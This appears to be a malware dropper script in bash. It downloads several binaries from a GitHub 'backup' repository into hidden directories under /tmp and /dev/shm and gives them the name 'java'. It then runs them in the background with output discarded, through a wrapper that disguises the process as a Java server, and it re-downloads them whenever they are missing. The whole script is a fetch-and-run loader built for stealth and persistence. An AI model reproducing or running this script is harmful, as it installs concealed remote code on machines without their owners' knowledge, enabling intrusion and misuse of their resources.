#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin/{.a,.b,.c} /dev/shm/.cache/{etc,log}
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/uid-amd64-v0.1.3 -o uid
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
    cd /dev/shm/.cache/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/stgm/n1.conf -o supervisord.conf
    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/chsl-v1.11.5-amd64 -o java
    cd /tmp/.java/bin/.c && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
}

function start_app() {
    chmod a+x /tmp/.java/bin/*** /tmp/.java/bin/.a/** /tmp/.java/bin/.c/**
    cd /dev/shm/.cache/log && nohup /tmp/.java/bin/uid ~~m ~~n 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ~~f /tmp/.java/bin/java >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.c/java" ]; then
    start_app
else
    rm -rf /tmp/.java/bin
    fetch_files
    start_app
fi